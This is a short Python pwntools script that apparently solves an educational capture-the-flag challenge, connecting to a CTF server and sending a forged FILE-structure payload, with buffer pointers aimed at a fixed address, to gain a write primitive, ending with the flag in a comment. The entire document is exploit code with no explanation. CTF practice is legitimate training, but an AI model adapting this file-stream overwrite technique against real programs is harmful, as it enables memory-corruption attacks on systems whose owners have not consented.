from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10009)
# r = process('./share/chal')
# gdb.attach(r)

owo_addr = 0x404070
fileno = 0
flags = 0xfbad0000
read_ptr = 0
read_end = 0
read_base = 0
write_base = owo_addr
write_ptr = 0
write_end = 0
buf_base = owo_addr
buf_end = owo_addr + 0x20
garbage = b'A'*8
chain = 0x00007f272ac816a0

payload = flat(
    garbage, garbage,
    garbage, garbage,
    flags, read_ptr,
    read_end, read_base,
    write_base, write_ptr,
    write_end, buf_base,
    buf_end, 0,
    0, 0,
    0, chain,
    fileno
)

r.send(payload)
r.interactive()
# send whatever using interactive
# FLAG{sushi}